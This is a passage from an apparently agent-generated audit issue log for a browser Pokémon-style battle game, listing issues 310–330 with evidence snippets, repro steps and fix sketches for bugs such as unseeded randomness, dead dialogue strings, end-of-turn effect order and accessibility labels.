**Repro**: Read CHANGELOG lines 23-27 alongside `STORY_MODE_FLOW.md §15d` and `_makePlayerLinkBuild` at line 42374.

**Blast radius**: Documentation only. A contributor following the CHANGELOG to understand Cable Link will be surprised when their pre-Gym-5 reroll never surfaces a Mega.

**Fix sketch**: Rewrite the CHANGELOG entry's "Cable Link is deliberately left ungated" paragraph to reflect actual code:
> Cable Link applies the same gimmick gate via `_makePlayerLinkBuild`
> (see `STORY_MODE_FLOW.md §15d`). The "premium another trainer's mon"
> vibe is preserved via the higher reroll cost + Tournament-tier
> build, not via mechanics surfacing pre-unlock.

**Verification**: After fix, CHANGELOG + spec + code all agree.

---

## <a id="ISSUE-310"></a> ISSUE-310: `createRoom` hardcodes Postgres SQLSTATE `23505` for unique-violation detection — defensive `.includes('duplicate')` fallback exists but the magic number is undocumented

---
id: ISSUE-310
severity: P3
category: refactor
anchor_symbol: createRoom_23505
current_line_hint: ~349
file: online-pvp.js
agents: [pvp-concurrency-hunter]
fingerprint: 28d225daff16_2
confidence: low
status: fixed-claude/sharp-keller-eZEDN
---

**Title**: `createRoom` hardcodes Postgres SQLSTATE `23505` for unique-violation detection — defensive `.includes('duplicate')` fallback exists but the magic number is undocumented

**Evidence**:
```js
// online-pvp.js L341-351
for (let attempt = 0; attempt < 8; attempt++) {
    roomCode = randomCode();
    const ins = await sb.from('pvp_rooms').insert({ code: roomCode, data }).select('id').single();
    if (!ins.error) { row = ins.data; break; }
    lastErr = ins.error;
    const dup = ins.error && (ins.error.code === '23505' || String(ins.error.message || '').toLowerCase().includes('duplicate'));
    //                                          ^^^^^^^ Postgres SQLSTATE for "unique_violation"
    if (!dup) throw ins.error;
}
```

**Repro**: Cosmetic. The fallback `.includes('duplicate')` covers the case where Supabase's error mapping changes (`error.code` becoming `'PGRST116'` or similar). Brittle to copy-paste into other tables (e.g., the gauntlet_leaderboard insert pattern in migration 002).

**Blast radius**: One site. No active bug.

**Fix sketch**: Add a constant `const PG_UNIQUE_VIOLATION = '23505';` at the top of the module with a one-line comment linking the Postgres docs. Or factor a helper `function isUniqueViolation(err)` so future callers (gauntlet leaderboard insert, etc.) share the same check.

**Verification**: Mechanical.

---

## <a id="ISSUE-311"></a> ISSUE-311: Crucible rematch pickers use bare Math.random — breaks the seeded-replay contract for post-game

---
id: ISSUE-311
severity: P3
category: design
anchor_symbol: crucibleGymPick
current_line_hint: ~48165
file: battle.html
agents: [story-mode-investigator]
fingerprint: f93740a17e98
confidence: medium
status: open
---

**Title**: Crucible rematch pickers use bare Math.random — breaks the seeded-replay contract for post-game

**Evidence**:
```js
function crucibleGymPick() {
    const row = _CRUCIBLE_GYM_ROWS[Math.floor(Math.random() * _CRUCIBLE_GYM_ROWS.length)];
    _crucibleBattleSetup(row, 'gym');
}
// also: _rollFrontierTeam / crucibleWildEncounter / _bossArcRollLegendary fall back to
// Math.random when sm.active is true-but-storyRngNext-path-not-taken
```
CLAUDE.md architecture rule: "Use seeded RNG (storyRngNext) everywhere user-visible, never bare Math.random()." Crucible gym selection picks the opponent via `Math.random`. Several post-game rolls (frontier team, wild encounter species) also use `Math.random` — some of those are *intentionally* unseeded (wild species, see `_pickWildSpeciesRandom` comment), but the gym pick and frontier team are user-visible battle setups that arguably should be seeded for shared-seed reproducibility.

**Repro**: Crucible → Random Gym Rematch repeatedly on the same seed → different leaders. (Likely acceptable for an endless rematch hub, but inconsistent with the stated determinism contract.)

**Blast radius**: Determinism/replay contract in the post-game. Low practical impact (post-game is freeform), but worth a maintainer decision on whether the Crucible is exempt from the seeded-RNG rule.

**Fix sketch**: Either route Crucible battle-setup rolls through `storyRngNext`, or add an explicit "post-game hub is intentionally unseeded" note next to `_CRUCIBLE_GYM_ROWS` so future audits stop flagging it.

**Verification**: Documented decision or seeded picks.

---

## <a id="ISSUE-312"></a> ISSUE-312: ELITE_VICTORY_LINES['Molayne'] is dead — Molayne is an Elite Trainer, not an E1–E4 boss

---
id: ISSUE-312
severity: P3
category: inconsistency
anchor_symbol: ELITE_VICTORY_LINES
current_line_hint: ~29703
file: battle.html
agents: [consistency-auditor]
fingerprint: a8e2044035af
confidence: high
status: open
---

**Title**: ELITE_VICTORY_LINES['Molayne'] is dead — Molayne is an Elite Trainer, not an E1–E4 boss

**Evidence**:
```js
// ELITE_VICTORY_LINES (line ~29703):
'Molayne':"Molayne: \"My circuits are humming. You earned the next gate.\"",
// but Molayne's only TRAINER_DATA row (line ~29100) is role 'Elite Trainer':
{ role:'Elite Trainer', name:'Molayne', type:'Steel', sigs:[...], spriteFile:'Molayne' },
// ELITE_VICTORY_LINES is only read on /^E[1-4]$/ events in showVictoryOverlay (~43047)
```

**Repro**: Cross-reference ELITE_VICTORY_LINES keys vs. the E1–E4 roster (`role:'E[1-4]'`). "Molayne" is in the table but is only an `Elite Trainer` (the generic ace class), which surfaces as the "Elite Trainer" / "Ace Trainer" event — never an `E1`–`E4` slot. showVictoryOverlay reads ELITE_VICTORY_LINES only inside the `/^E[1-4]$/` branch, so Molayne's line is unreachable.

**Blast radius**: Dead string only. All 31 actual E1–E4 names resolve to both an ELITE_VICTORY_LINES entry and a TRAINER_QUOTES_BY_NAME intro pool, so the live data is complete — this is just a stray key (mirrors the Hau case in the Champion table).

**Fix sketch**: Remove the Molayne entry from ELITE_VICTORY_LINES (he speaks via TRAINER_QUOTES_BY_NAME on intro as an Elite Trainer; there is no E1–E4 victory-card path for that class). Leave the rest of the table as-is.

**Verification**: Re-run the keys-vs-roster cross-reference; ELITE_VICTORY_LINES should have no keys outside the E1–E4 roster.

---

## <a id="ISSUE-313"></a> ISSUE-313: Leech Seed drain is processed AFTER burn/poison/toxic damage (canon order is before)

---
id: ISSUE-313
severity: P3
category: bug
anchor_symbol: endOfTurnEffects
current_line_hint: ~28183
file: battle.html
agents: [battle-engine-debugger]
fingerprint: efa26d799b51
confidence: high
status: open
---

**Title**: Leech Seed drain is processed AFTER burn/poison/toxic damage (canon order is before)

**Evidence**:
```js
// Order in endOfTurnEffects: status damage (BRN/PSN/TOX) at ~28129, THEN Leech Seed at ~28183.
// Canonical Gen end-of-turn order: ... Ingrain → Leech Seed → Poison/Toxic → Burn → Curse → trap ...
```
Leech Seed (canon order ~9) should drain before Poison (~10) and Burn (~11); the engine has poison/burn first.

**Repro**: Static read of `endOfTurnEffects`. A seeded + poisoned mon at low HP: canon drains via Leech Seed first (seeder heals), then poison; the engine poisons first, so a mon that faints to poison never feeds the seeder.

**Blast radius**: Edge case — both effects on one low-HP mon. Decides whether the seeder gets its Leech Seed heal when the seeded mon is dying. Low frequency.

**Fix sketch**: Move the Leech Seed block above the status-damage block (after Aqua Ring / Ingrain, before BRN/PSN/TOX) to match canon residual order. Deferred here as a contained code-movement to avoid risk in the same pass as the higher-impact fixes.

**Verification**: Seeded + poisoned low-HP mon; assert Leech Seed log precedes the poison log and the seeder heals before the mon faints.

---

## <a id="ISSUE-314"></a> ISSUE-314: Relic Annex intro uses plain-text `_storyShowOneTimeTip`; every other facility uses a sprite-backed scene

---
id: ISSUE-314
severity: P3
category: inconsistency
anchor_symbol: enterArtifactShop
current_line_hint: ~45536
file: battle.html
agents: [consistency-auditor]
fingerprint: 6f0acce30a29
confidence: high
status: open
---

**Title**: Relic Annex intro uses plain-text `_storyShowOneTimeTip`; every other facility uses a sprite-backed scene

**Evidence**:
```js
// 45536 — Relic Annex first-visit intro (text-only tip, no NPC sprite/nameplate):
try { _storyShowOneTimeTip('relic',
  'The Relic Annex.\n\nThree relics on the shelf, one purchase per visit. …'); } catch (e) {}
// vs STORY_TUTORIAL_SCENES entries (firstSafari, firstStoneShop, firstMoveTutor, …)
// which render sprite + nameplate + Continue via _showStoryTutorialScene.
```

**Repro**: First visit to the Relic Annex shows a plain text tip box. First visit to Safari/Stone Shop/Move Tutor/Dept/etc. shows a character-portrait dialog scene (Safari Warden, Emporium Keeper, etc.). The relic intro is present and well-written — only the *delivery mechanism* is inconsistent with the other 19 facility intros.

**Blast radius**: Purely presentational. REDESIGN_PLAN §2 promotes the artifact store to an always-on top-level action with a "mandatory one-time intro (dark-mysterious tone)" — the relic intro should match the sprite-scene treatment the redesign expects, and a Relic Keeper sprite already exists (used by the recurring `relicKeeper` quote pool).

**Fix sketch**: Add a `firstRelic` entry to STORY_TUTORIAL_SCENES (sprite + "Relic Keeper" nameplate, reuse the existing copy) and call `playStoryTutorial('firstRelic')` from enterArtifactShop in place of the `_storyShowOneTimeTip('relic', …)` call.

**Verification**: First Relic Annex visit shows a portrait dialog matching the other facility intros; the dark-mysterious framing reads in the Relic Keeper's voice.

---

## <a id="ISSUE-315"></a> ISSUE-315: enterArtifactShop and enterShop lack the _storyTryBeginInteraction guard used by other facility entries

---
id: ISSUE-315
severity: P3
category: dx
anchor_symbol: enterArtifactShop
current_line_hint: ~50164
file: battle.html
agents: [story-mode-investigator]
fingerprint: e6e64f34eac5
confidence: medium
status: open
---

**Title**: enterArtifactShop and enterShop lack the _storyTryBeginInteraction guard used by other facility entries

**Evidence**:
```js
function enterArtifactShop() {   // no _storyTryBeginInteraction()
function enterShop(type) {       // no _storyTryBeginInteraction()
// vs enterCasino/enterTutor/enterLink/enterStoneShop which all wrap in the lock
```

**Repro**: Shop + Artifact-shop are the only commerce facilities without the entry interaction lock.

**Blast radius**: Consistency/robustness; currently harmless (idempotent renders).

**Fix sketch**: Add the guard wrapper for parity, or document why shop entries are lock-free.

**Verification**: All enter<Facility> follow the same pattern.

---

## <a id="ISSUE-316"></a> ISSUE-316: City0 welcome tip says the Underground "buys … never your starter" but starters are sellable

---
id: ISSUE-316
severity: P3
category: inconsistency
anchor_symbol: enterCity
current_line_hint: ~42439
file: battle.html
agents: [story-mode-investigator]
fingerprint: 2b18728e7602
confidence: high
status: open
---

**Title**: City0 welcome tip says the Underground "buys … never your starter" but starters are sellable

**Evidence**:
```js
// _storyShowOneTimeTip('welcome', ...): "...an Underground that buys the ones you outgrow — never your starter."
// Contradicts the unsellable-strip backfill + pickProfessorChoice comment ("can ... sell it like any other partner").
```

**Repro**: Read the City0 welcome tutorial, then sell the starter in the Underground.

**Blast radius**: Same root as FP3 — onboarding copy now disagrees with current mechanics.

**Fix sketch**: Reconcile with the FP3 decision; update the welcome tip clause to match.

**Verification**: Welcome tip matches actual sell rules.

---

## <a id="ISSUE-317"></a> ISSUE-317: Crucible sub-sections improve wayfinding but the orientation tip + "Mystery vs Caged God" disambiguation still lean on long alert text

---
id: ISSUE-317
severity: P3
category: design
anchor_symbol: enterCrucible
current_line_hint: ~48118
file: battle.html
agents: [story-mode-investigator]
fingerprint: 75a751b3f4d7
confidence: medium
status: open
---

**Title**: Crucible sub-sections improve wayfinding but the orientation tip + "Mystery vs Caged God" disambiguation still lean on long alert text

**Evidence**:
```js
<h4>Post-Game Quest</h4> ... <h4>Battles</h4> ... <h4>Facilities</h4>
//   Train & Evolve / Shop / Catch, Store & Trade sub-headers (good)
// but disambiguation is carried by button title= tooltips + a multi-paragraph
// _storyShowOneTimeTip('crucible', '...The Mystery Figure is a separate masked
//   trainer — not the Caged God...') and the orientation tip in continuePostGame.
```
The maintainer's sub-sectioning (Post-Game Quest / Battles / Facilities{Train&Evolve, Shop, Catch}) is a clear improvement. Remaining friction: (1) the Mystery-Figure-vs-Caged-God distinction is only explained in a one-time alert + a hover tooltip — on a touch device with the tip dismissed, the two purple "mystery"-flavored affordances (Caged God section + Mystery Figure button) read as the same thing; (2) there is no persistent inline caption under the Mystery Figure button repeating "separate from the Caged God hunt above."

**Repro**: Post-HoF on touch, dismiss the orientation tip, open Crucible → the Mystery Figure button and the Caged God quest box both use purple/🔮-🥷 styling with no persistent on-screen text linking/distinguishing them.

**Blast radius**: Post-game wayfinding (maintainer-named concern). Low severity; purely additive copy.

**Fix sketch**: Add a one-line persistent caption under the Mystery Figure button ("A masked 6-mon trainer rematch — not the Caged God quest above") and/or a small "?" affordance that re-opens the disambiguation tip on demand. Consider a different accent color for the Caged God section vs the Mystery button.

**Verification**: A player who never reads the alert can still tell the two purple affordances apart from on-screen text alone.

---

## <a id="ISSUE-318"></a> ISSUE-318: Poké Center chip sits in "Heal & Team" section with a "Free" badge but performs no heal interaction

---
id: ISSUE-318
severity: P3
category: inconsistency
anchor_symbol: enterPokemonCenter
current_line_hint: ~42968
file: battle.html
agents: [story-mode-investigator]
fingerprint: ea3cd4d05640
confidence: high
status: open
---

**Title**: Poké Center chip sits in "Heal & Team" section with a "Free" badge but performs no heal interaction

**Evidence**:
```js
_push('recover', makeActionBtn('🏥 Pokémon Center','center','window.StoryMode.enterPokemonCenter()','center', _facOpts('center', [{label:'Free',tone:'free'}])));
// Section header: _emit('recover', ..., 'Heal & Team')
// enterPokemonCenter() only opens PC Storage + Underground tabs. No nurse-heal action exists
// in #screen-story-pokemoncenter (only Storage / Underground tabs, lines ~9030-9038).
```

**Repro**: Open a city hub; the Pokémon Center sits under "Heal & Team" labelled "Free". Click it — there is no heal button; party HP/PP/status restoration happens automatically between battles regardless.

**Blast radius**: Player mental model. New players expecting a classic "heal your party?" prompt find only PC/Underground. Compounds finding FP1 (fatigue) and the rival-gate "Heal" tip (FP5).

**Fix sketch**: If the auto-heal model is intended, retitle the chip/section to reflect "PC & Storage" or add an explicit (cosmetic-or-real) "Rest your team" affordance so the label is honest.

**Verification**: Center label/affordance matches what the facility actually does.

---

## <a id="ISSUE-319"></a> ISSUE-319: Story facility regions use weak lowercase aria-labels ("story pokemoncenter", "story link")

---
id: ISSUE-319
severity: P3
category: dx
anchor_symbol: enterPokemonCenter
current_line_hint: ~9018
file: battle.html
agents: [story-mode-investigator]
fingerprint: 5e12a6740351
confidence: medium
status: open
---

**Title**: Story facility regions use weak lowercase aria-labels ("story pokemoncenter", "story link")

**Evidence**:
```html
<div id="screen-story-pokemoncenter" ... role="region" aria-label="story pokemoncenter" ...>
<div id="screen-story-link" ... role="region" aria-label="story link" ...>
```

**Repro**: Screen-reader users entering these facilities hear "story pokemoncenter" / "story link" rather than the human label the screen header shows ("Pokémon Center" / "Cable Link Station").

**Blast radius**: A11y only. showScreen focuses the region on entry (line ~53292), so the aria-label is the first thing announced.

**Fix sketch**: Set aria-label to the displayed facility name ("Pokémon Center", "Cable Link Station"). Same pattern applies to sibling story-screen regions.

**Verification**: Region announces the friendly facility name on focus.

---

## <a id="ISSUE-320"></a> ISSUE-320: `enterProfessor` duplicates gimmick-gate logic inline instead of using `_withStoryPlayerGimmickGate`

---
id: ISSUE-320
severity: P3
category: dx
anchor_symbol: enterProfessor
current_line_hint: ~36966
file: battle.html
agents: [story-mode-investigator]
fingerprint: 6240f054e598
confidence: medium
status: fixed-claude/sharp-keller-eZEDN
---

**Title**: `enterProfessor` duplicates gimmick-gate logic inline instead of using `_withStoryPlayerGimmickGate`

**Evidence**:
```js
// battle.html ~36966  (enterProfessor choice loop)
try {
    window._pbsStoryUsePlayerGimmickGate = true;
    window._pbsStoryUnlockedGimmicks = sm.unlockedGimmicks || [];
    build = makeBuild(name);
} finally {
    window._pbsStoryUsePlayerGimmickGate = false;
    delete window._pbsStoryUnlockedGimmicks;
}

// battle.html ~10766 — the helper EXISTS:
function _withStoryPlayerGimmickGate(fn) {
    try {
        window._pbsStoryUsePlayerGimmickGate = true;
        window._pbsStoryUnlockedGimmicks = (typeof sm !== 'undefined' && sm && Array.isArray(sm.unlockedGimmicks)) ? sm.unlockedGimmicks : [];
        return fn();
    } finally { ... }
}
```
Same idiom also duplicated in `_makePlayerLinkBuild` (line 42374). Three identical copies of the gate logic; only `makeWildBuild` and `_bossArcRollLegendary` and the roaming-legendary prepare actually use the helper.

**Repro**: `grep -nE "_pbsStoryUsePlayerGimmickGate = true" battle.html` returns 3 sites (Professor, Link, plus implicit via the helper). The helper is two lines shorter at call sites and was added precisely to consolidate this pattern.

**Blast radius**: DX only. Every duplicated copy is a place where a future contributor might fix the gate at one site and miss the others.

**Fix sketch**: Replace the inline try/finally in `enterProfessor` and `_makePlayerLinkBuild` with `build = _withStoryPlayerGimmickGate(() => makeBuild(name));`. Identical semantics, three lines saved per site.

**Verification**: After consolidation, `grep -c "_pbsStoryUsePlayerGimmickGate = true" battle.html` returns 1 (the helper) instead of 3.

---

## <a id="ISSUE-321"></a> ISSUE-321: `enterProfessor` reuses `_pendingProfChoices` across city visits at the same cityIdx — stale picks may persist past spec'd one-shot pool

---
id: ISSUE-321
severity: P3
category: bug
anchor_symbol: enterProfessor
current_line_hint: ~36935
file: battle.html
agents: [story-mode-investigator]
fingerprint: 11baf155adf0
confidence: medium
status: fixed-claude/sharp-keller-eZEDN
---

**Title**: `enterProfessor` reuses `_pendingProfChoices` across city visits at the same cityIdx — stale picks may persist past spec'd one-shot pool

**Evidence**:
```js
// battle.html ~36935
const shouldReuseChoices = Array.isArray(_pendingProfChoices)
    && _pendingProfChoices.length > 0
    && _pendingProfCityIdx === cityIdx
    && _pendingProfWasMystery === _profMysteryMode;
```
The reuse predicate keys only on cityIdx + mystery mode. If the player visits City 3's Professor (rolls 3 choices), backs out without picking, walks all the way to City 8 and back to City 3, the same 3 picks re-appear. Spec is silent on whether picks should be re-rolled on each visit, but the current behaviour also bypasses any later changes to the enabled gens / settings that affect the roll.

**Repro**: Visit City 3 Professor; note the 3 rolled species. Decline. Walk to City 8 and back. Visit City 3 Professor again. Same 3 species (assuming `sm.profUsed[3]` was never set, which happens on Decline, not just dismissal).

**Blast radius**: Mild. Players may be subtly trapped into the same first pick across a long road trip, even though they expected fresh picks. Combined with the city-tier-specific tier curve, this means a player who returns at higher badges still sees the lower-tier rolls.

**Fix sketch**: Either invalidate `_pendingProfChoices` whenever `sm.badges` changes since the last visit, or refresh on every entry (the cost is small — three `makeBuild` calls). Or document that the reuse is intentional ("picker is sticky until you accept or until a hub state change clears it").

**Verification**: After fix, returning to a Prof at higher badges shows fresh tier-curve-appropriate picks.

---

## <a id="ISSUE-322"></a> ISSUE-322: Professor flavor quote uses bare Math.random(), breaking seeded replay determinism

---
id: ISSUE-322
severity: P3
category: bug
anchor_symbol: enterProfessor
current_line_hint: ~45024
file: battle.html
agents: [story-mode-investigator]
fingerprint: d0f5b2e6c31c
confidence: high
status: open
---

**Title**: Professor flavor quote uses bare Math.random(), breaking seeded replay determinism

**Evidence**:
```js
_profQuote = PROF_QUOTES[Math.floor(Math.random() * PROF_QUOTES.length)];
// chosen BEFORE the storyRngNext seed-override block (~45050) and never seeded
```

**Repro**: Re-enter the same Professor visit on the same run seed after a refresh; the flavor quote differs run-to-run. Same class as prior audit 1.1 (rival intro line).

**Blast radius**: Cosmetic only; violates the "seed determines everything user-visible" contract in CLAUDE.md. Choices themselves are correctly seeded.

**Fix sketch**: Route the quote pick through storyRngNext (or the prof seed key) so the visit reproduces.

**Verification**: Two enterProfessor calls with identical sm/runSeed produce identical story-prof-quote text.

---

## <a id="ISSUE-323"></a> ISSUE-323: Empty-choices Professor path shows status but renders no body buttons

---
id: ISSUE-323
severity: P3
category: bug
anchor_symbol: enterProfessor
current_line_hint: ~45149
file: battle.html
agents: [story-mode-investigator]
fingerprint: c0b555664db0
confidence: medium
status: open
---

**Title**: Empty-choices Professor path shows status but renders no body buttons

**Evidence**:
```js
if (!choices.length) {
    statusEl.textContent = 'No Pokémon available for your enabled generations.';
    showScreen('screen-story-professor');
    return; // returns BEFORE _renderProfChoices(); btnsEl left as-is
}
```

**Repro**: Force an empty enabled-gen pool at a Professor city. The body shows the error text with no Back/Accept buttons; the player must use the small header back arrow. Not a hard softlock (header back exists) but the in-body action area is empty/stale.

**Blast radius**: UX dead-end feel; relies entirely on header chrome. Realistically only reachable via aggressive gen toggles.

**Fix sketch**: Before the early return, render a single "← Back to City" button into story-prof-buttons (or clear btnsEl and add it).

**Verification**: Trigger the empty pool; confirm a Back button appears in the body.

---

## <a id="ISSUE-324"></a> ISSUE-324: Exp Share Voucher item (3TRACK_IMPL_PLAN PR-5) never shipped; `sm.inventory.expShareVoucher` is dead init

---
id: ISSUE-324
severity: P3
category: inconsistency
anchor_symbol: expShareVoucher
current_line_hint: ~38778
file: battle.html
agents: [spec-drift-auditor]
fingerprint: 70fdae9ad188
confidence: high
status: open
---

**Title**: Exp Share Voucher item (3TRACK_IMPL_PLAN PR-5) never shipped; `sm.inventory.expShareVoucher` is dead init

**Evidence**:
```
docs/story-design/STORY_3TRACK_IMPL_PLAN.md:551 "function applyExpShareVoucher(monId, levels) { … mon.level += n … }"
battle.html:38778  expShareVoucher:0,   // init only — never read/written elsewhere
```

**Repro**: The plan (PR-5, lines 546–564, tests 572–573) specs an Exp Share Voucher wallet + Bag modal + `applyExpShareVoucher`. In code, `expShareVoucher` is initialized to 0 and never referenced again (`grep -n expShareVoucher battle.html` → one line). The extra-raid reward instead grants 6 random vitamins (`_storyGrantTrackEndReward`, ~41770), with an in-code comment explaining the flat-L100 game has no per-mon level system so the voucher couldn't land.

**Blast radius**: Doc describes a whole item + UI + 2 tests that don't exist; the dead save field is harmless but confuses schema readers.

**Fix sketch**: Update STORY_3TRACK_IMPL_PLAN.md PR-5 to record that the Exp Share Voucher was replaced by a 6-vitamin bundle (flat-L100 rationale), and either remove the dead `expShareVoucher:0` init or note it as reserved.

**Verification**: Plan reflects the shipped vitamin-bundle reward; no doc references an unbuilt `applyExpShareVoucher`.

---

## <a id="ISSUE-325"></a> ISSUE-325: `expShareVoucher:0` inventory field is dead — no reader, no writer; extra-raid reward grants vitamins instead

---
id: ISSUE-325
severity: P3
category: data
anchor_symbol: expShareVoucher
current_line_hint: ~39151
file: battle.html
agents: [story-mode-investigator]
fingerprint: 5c179bd13408
confidence: high
status: open
---

**Title**: `expShareVoucher:0` inventory field is dead — no reader, no writer; extra-raid reward grants vitamins instead

**Evidence**:
```js
// sm.inventory defaults (~39151)
expShareVoucher:0,
```
Grep `expShareVoucher` over battle.html → exactly ONE hit (the declaration). No code reads or increments it. The extra-arc raid reward (`_storyGrantTrackEndReward`, `~42144`) writes a 6-vitamin bundle to `hpUp/protein/iron/calcium/zinc/carbos`, never to `expShareVoucher`. The "EXP SHARE" label is only in the alert text (`~42159`).

**Repro**: `grep -rnE "expShareVoucher" battle.html` → 1 line. Probe: raid grant adds 6 vitamins; `expShareVoucher` stays 0.

**Blast radius**: Orphaned scaffolding from the original ISSUE-243 EXP-Share design (cut because the game is flat-L100). Persisted into every save's inventory object. No functional impact, but it is exactly the kind of dead init that should be removed before reworking the EXP-Share reward to avoid confusion about which field is authoritative.

**Fix sketch**: Remove the `expShareVoucher:0` line from the `sm.inventory` defaults. No migration needed (nothing reads it). Note for the upcoming EXP-Share rework: the real currency is vitamins, not this voucher.

**Verification**: grep shows zero `expShareVoucher` references; fresh-run inventory has no such key; existing saves are unaffected (extra key is ignored).

---

## <a id="ISSUE-326"></a> ISSUE-326: Service-availability timeline reference (Task 1 deliverable) — first-appearance / reappear / unlock map

---
id: ISSUE-326
severity: P3
category: data
anchor_symbol: FACILITY_DEBUT_CITY
current_line_hint: ~29085
file: battle.html
agents: [story-mode-investigator]
fingerprint: 6c771c9b218f
confidence: high
status: open
---

**Title**: Service-availability timeline reference (Task 1 deliverable) — first-appearance / reappear / unlock map

**Evidence**:
```js
const FACILITY_DEBUT_CITY = {
    mart:0, tutor:0, nature:0, center:0, relic:0,
    link:2, stoneShop:2, evolab:2,
    dept:6, casino:5, dojo:4, evtrainer:4, safari:4, colress:6,
};  // fanclub omitted (opt-in, no debut gate)
```

**Repro**: Cross-referenced `FACILITY_DEBUT_CITY` (29085) + per-city action arrays in `STORY_EVENTS_RAW` + injection sites (Center 39000, Fan Club `_seedFanClubAcrossCities` 29097, Daycare 39008, Fight Club 39015, Safari 39026). Canonical service map:

| Service | First | Reappears? | Unlock |
|---|---|---|---|
| Pokémart | C0 | every city EXCEPT C6 (Dept substitutes, filtered 38561) | none |
| Move Tutor | C0 | C2–C9 (skips C1) | team≥1 |
| Nature Rater | C0 | C3,C5–C9 (skips C1,C2,C4) | team≥1 |
| Pokémon Center (PC+Underground+Rivalry) | C0 | every city (injected) | none |
| Pokémon Fan Club (IV) | C0 | every city (injected) | team≥1 |
| Relic Annex (Artifact buy) | C0 | nested under Dept (C6/C8/C9) | — |
| Link Station / Stone Shop / Stone Sage | C2 | every city after | none |
| Battle Dojo / EV Trainer / Safari | C4 | Dojo+EV every city after; Safari C4 ONLY | team≥1 (Safari city-gated) |
| Poké Casino | C5 | C5 + C9 only (cyclic) | none |
| Department Store | C6 | C6,C8,C9 (cyclic) | none |
| Colress ("Power Up") | C6 | every city after | team≥1 + a mech toggle on |
| Professor | C0 | C0–C5 pre-gym hubs; C6–C8 via shouldForceCityProfessor; hidden at party-cap (exc. C8 legendary gate); never C9 | party<cap |
| Daycare (egg) | C1 post-gym (Gym1 win) | until egg taken | sm.daycare.unlocked |
| Fight Club | C-where-6-badges | repeatable post-HoF | daycare secret @6 badges |
| The Crucible | post-HoF | every city | bossArc.available |

**Blast radius**: Reference artifact for Task 1 pacing decisions. Clumping at C2 (Link+StoneShop+StoneSage) and C4 (Dojo+EV+Safari); dead zone at C1 (see finding #10); gappy Nature Rater (#11).

**Fix sketch**: N/A — data reference. Use alongside findings #10/#11 for pacing.

**Verification**: Re-extract action lists per city; confirm against this table.

---

## <a id="ISSUE-327"></a> ISSUE-327: Crucible-reachable Frontier surrender uses raw window.confirm — drops fullscreen, breaks modal convention

---
id: ISSUE-327
severity: P3
category: dx
anchor_symbol: frontierSurrender
current_line_hint: ~48295
file: battle.html
agents: [story-mode-investigator]
fingerprint: 2a1b8a63bc6e
confidence: high
status: open
---

**Title**: Crucible-reachable Frontier surrender uses raw window.confirm — drops fullscreen, breaks modal convention

**Evidence**:
```js
function frontierSurrender() {
    ...
    const ok = window.confirm('Surrender? Streak ' + cur + ' will be saved...');
    if (!ok) return;
```
The file header comment (line ~8644) states the codebase uses in-page messages "instead of native alert()/confirm() so fullscreen is not dropped by the browser." Most flows use `window.showGameConfirm`. `frontierSurrender` (and the Fight Club forfeit at ~44591) use raw `window.confirm` with no `showGameConfirm` path.

**Repro**: Enter fullscreen, Crucible → Battle Frontier → start run → Surrender. Browser exits fullscreen for the native dialog.

**Blast radius**: Battle Frontier is post-game (technically out of active scope), but it's surfaced directly in the Crucible the maintainer is actively editing, so the inconsistency is now in the priority surface. Low severity.

**Fix sketch**: Replace with `await window.showGameConfirm(...)` like the EV-wipe and new-adventure paths.

**Verification**: Surrender prompt renders as an in-page modal; fullscreen is preserved.

---

## <a id="ISSUE-328"></a> ISSUE-328: Gauntlet score readout is a plain div with no live region — score changes are silent to SR

---
id: ISSUE-328
severity: P3
category: a11y
anchor_symbol: gauntlet-score
current_line_hint: ~9010
file: battle.html
agents: [accessibility-ux-auditor]
fingerprint: 89ea3a3e2152
confidence: medium
status: open
---

**Title**: Gauntlet score readout is a plain div with no live region — score changes are silent to SR

**Evidence**:
```html
<div id="gauntlet-score" class="hidden">Score: 0</div>
```

**Repro**: In Gauntlet mode the score updates between rounds via `gauntletScore.textContent` but the element has no `aria-live`/`role="status"`, so screen-reader users never hear their score change. (Contrast with `#field-conditions` L9036 and casino result strips, which correctly use `aria-live="polite"`.) REDESIGN_PLAN §6's Fight Club gauntlet reuses this readout, so the gap propagates.

**Blast radius**: Gauntlet HUD; future Fight Club score display.

**Fix sketch**: Add `role="status" aria-live="polite"` to `#gauntlet-score` (and any new gauntlet round-result readout).

**Verification**: SR announces the new score when it updates after a round.

---

## <a id="ISSUE-329"></a> ISSUE-329: Paralysis tooltip says "Speed quartered" but engine halves speed (0.5) — stale Gen 1-6 text vs Gen 7+ behavior

---
id: ISSUE-329
severity: P3
category: inconsistency
anchor_symbol: getDownStatusLabel
current_line_hint: ~17613
file: battle.html
agents: [battle-engine-debugger]
fingerprint: 1e8eb0a0eb0d
confidence: high
status: open
---

**Title**: Paralysis tooltip says "Speed quartered" but engine halves speed (0.5) — stale Gen 1-6 text vs Gen 7+ behavior

**Evidence**:
```js
// Tooltip (17613): PAR: 'Paralyzed — Speed quartered · 25% chance to skip turn'
// Help text (10633): "PAR — 25% chance to skip turn, halves Speed"  (contradicts itself)
// Engine (20553): if (mon.status === "PAR" && mon.ability !== "Quick Feet") spe *= 0.5;  // HALVES
```

**Repro**: Grep `status === "PAR"` — every speed application uses `* 0.5` (lines 20553, 22290-22297). The engine is correctly Gen 7+ (halve). Only the 17613 tooltip string says "quartered" (Gen 1-6). The 10633 help blurb already says "halves Speed", so the two UI strings disagree.

**Blast radius**: Cosmetic/trust only — no damage or turn-order impact. Players reading the pill tooltip will mis-estimate paralysis speed.

**Fix sketch**: Change the 17613 tooltip from "Speed quartered" to "Speed halved" to match the engine and the 10633 help text.

**Verification**: Grep confirms no remaining "quartered" PAR string; UI pill matches the help blurb.

---

## <a id="ISSUE-330"></a> ISSUE-330: Rival phase enum skips 1 (EARLY rival returns phase 2), leaving a dead phase-1 dialogue pool

---
id: ISSUE-330
severity: P3
category: inconsistency
anchor_symbol: getRivalEncounterPhase
current_line_hint: ~33135
file: battle.html
agents: [story-mode-investigator]
fingerprint: e8cd41a9b1ad
confidence: medium
status: open
---

**Title**: Rival phase enum skips 1 (EARLY rival returns phase 2), leaving a dead phase-1 dialogue pool

**Evidence**:
```js
function getRivalEncounterPhase(storyRowIdx) {
    if (id === STORY_RIVAL_ROW_INTRO) return 0;
    if (id === STORY_RIVAL_ROW_EARLY) return 2;   // <- never 1
    if (id === STORY_RIVAL_ROW_MID)   return 3;
    if (id === STORY_RIVAL_ROW_LEAGUE) return 4;
```
